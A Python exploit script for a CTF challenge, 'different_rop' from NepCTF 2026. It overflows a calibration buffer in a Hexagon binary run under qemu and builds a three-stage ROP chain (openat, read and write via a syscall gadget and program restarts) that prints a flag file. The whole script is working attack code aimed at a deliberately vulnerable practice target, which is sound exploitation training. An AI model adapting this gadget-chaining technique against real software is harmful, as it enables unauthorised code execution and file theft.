#!/usr/bin/env python3
"""
Exploit for "different_rop" challenge (NepCTF 2026)
Hexagon architecture ROP via calibration buffer overflow.

Chain: openat("/flag") -> restart -> read(3, bss, n) -> restart -> write(1, bss, n)
"""

import struct
import subprocess
import sys
import os

os.chdir('/data/project/ctf-repo/pwn/nepctf2026/different_rop')

# Hexagon syscall numbers (asm-generic)
SYS_OPENAT = 56
SYS_READ   = 63
SYS_WRITE  = 64

AT_FDCWD = 0xFFFFFF9C  # -100 as u32
BSS_BUF  = 0x4bd88     # .bss area, persists across restarts
FLAG_ADDR = 0x4080e4e0 # note+32, where "/flag" string sits

# Trap0 gadget: loads R6,R0-R5 from [R30-offsets], executes syscall
TRAP0 = 0x2ba08
# Entry point restart: reinitializes SP, calls main
RESTART = 0x21168

def build_note(sysno, r0, r1, r2, r3=0, r4=0, r5=0, has_flag=False):
    """Build 64-byte calibration note for a single syscall + restart."""
    note = bytearray(64)

    # Syscall args (R30 = 0x4080e4f8, offsets -0x34..-0x1C)
    struct.pack_into('<I', note, 4,  r5)     # [R30-0x34] R5
    struct.pack_into('<I', note, 8,  r4)     # [R30-0x30] R4
    struct.pack_into('<I', note, 12, r3)     # [R30-0x2C] R3
    struct.pack_into('<I', note, 16, r2)     # [R30-0x28] R2
    struct.pack_into('<I', note, 20, r1)     # [R30-0x24] R1
    struct.pack_into('<I', note, 24, r0)     # [R30-0x20] R0
    struct.pack_into('<I', note, 28, sysno)  # [R30-0x1C] R6

    if has_flag:
        note[32:38] = b'/flag\x00'

    # Dealloc_return chain through note[48..63]
    struct.pack_into('<I', note, 48, 0x4080e4f8)  # R30_first
    struct.pack_into('<I', note, 52, TRAP0)        # R31_first → syscall
    struct.pack_into('<I', note, 56, 0x4080e4f0)   # R30_after  (R29 after trap0)
    struct.pack_into('<I', note, 60, RESTART)       # R31_after  → restart program

    return note

def communicate(p, cmd_bytes):
    """Send bytes to qemu process, return all output received."""
    try:
        p.stdin.write(cmd_bytes)
        p.stdin.flush()
    except BrokenPipeError:
        pass
    out = b''
    try:
        while True:
            chunk = p.stdout.read(4096)
            if not chunk:
                break
            out += chunk
    except:
        pass
    return out

# ---------------------------------------------------------------------------
# Stage 1: openat(AT_FDCWD, "/flag", O_RDONLY)
# ---------------------------------------------------------------------------
print("[*] Starting qemu-hexagon...")
p = subprocess.Popen(
    ['./qemu-hexagon', '-strace', './pwn'],
    stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
    bufsize=0
)

# Wait for initial menu
out = communicate(p, b'')
print(f"[*] Initial output: {len(out)} bytes")
if b'ROP Register Lab' not in out:
    out += p.stdout.read(4096)

note1 = build_note(SYS_OPENAT, AT_FDCWD, FLAG_ADDR, 0, has_flag=True)
print(f"[*] Stage 1: openat('/flag')")
p.stdin.write(b'3\n' + bytes(note1) + b'\n')
p.stdin.flush()

# Read output until we see the menu a SECOND time (restarted)
out = b''
for _ in range(20):
    chunk = p.stdout.read(4096)
    if not chunk:
        break
    out += chunk
    if out.count(b'ROP Register Lab') >= 2:
        break

print(f"[*] Stage 1 done. Menu appeared {out.count(b'ROP Register Lab')} times")

# ---------------------------------------------------------------------------
# Stage 2: read(3, BSS_BUF, 0x100)
# ---------------------------------------------------------------------------
note2 = build_note(SYS_READ, 3, BSS_BUF, 0x100)
print(f"[*] Stage 2: read(3, BSS_BUF, 0x100)")
p.stdin.write(b'3\n' + bytes(note2) + b'\n')
p.stdin.flush()

out = b''
for _ in range(20):
    chunk = p.stdout.read(4096)
    if not chunk:
        break
    out += chunk
    if out.count(b'ROP Register Lab') >= 3:
        break

print(f"[*] Stage 2 done. Menu count: {out.count(b'ROP Register Lab')}")

# ---------------------------------------------------------------------------
# Stage 3: write(1, BSS_BUF, 0x100)
# ---------------------------------------------------------------------------
note3 = build_note(SYS_WRITE, 1, BSS_BUF, 0x100)
print(f"[*] Stage 3: write(1, BSS_BUF, 0x100)")
p.stdin.write(b'3\n' + bytes(note3) + b'\n')
p.stdin.flush()

# Read all remaining output
out = b''
for _ in range(10):
    chunk = p.stdout.read(4096)
    if not chunk:
        break
    out += chunk

print(f"[*] Stage 3 output: {len(out)} bytes")

# Kill the process and collect stderr
p.kill()
p.wait()

stderr = p.stderr.read().decode(errors='replace')
print("\n=== STDERR ===")
for line in stderr.split('\n'):
    if any(kw in line for kw in ['openat', 'read(', 'write(', 'SIG']):
        print(line.strip())

# Show stdout (may contain flag)
stdout = out.decode(errors='replace')
print("\n=== STDOUT (last 2KB) ===")
print(stdout[-2000:])
